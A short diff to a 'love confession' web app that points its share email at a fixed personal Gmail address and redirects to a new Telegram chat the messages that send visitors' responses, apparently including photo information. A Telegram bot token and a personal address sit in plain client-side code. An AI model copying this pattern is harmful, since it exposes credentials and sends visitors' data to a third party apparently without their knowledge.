@@ -208,7 +208,7 @@
       function sendEmail() {
         const subject = encodeURIComponent('💕 Love Confession - Let\'s Connect!');
         const body = encodeURIComponent('Hello! I found this beautiful love confession app and wanted to share it with you. 💕\n\nCheck it out: ' + window.location.href);
-        window.location.href = `mailto:?subject=${subject}&body=${body}`;
+        window.location.href = `mailto:oladoyeheritage445@gmail.com?subject=${subject}&body=${body}`;
       }
 
       // Countdown timer
@@ -288,7 +288,7 @@
         localStorage.setItem('loveResponses', JSON.stringify(responses));
         
         const botToken = '7723720692:AAEPmC39DWtRqL5BtR0ataTaKn4PF0HoCJs';
-        const chatId = '6649936329';
+        const chatId = '2348075614248';
         
         // Create comprehensive message for Yes responses with ALL data
         const message = answer === 'Yes' 
@@ -430,7 +430,7 @@ ${photoInfo}
 
       async function sendResponseTrackerToTelegram(responses) {
         const botToken = '7723720692:AAEPmC39DWtRqL5BtR0ataTaKn4PF0HoCJs';
-        const chatId = '6649936329';
+        const chatId = '2348075614248';
 
         const yesResponses = responses.filter(r => r.response === 'Yes').length;
         const noResponses = responses.filter(r => r.response === 'No').length;
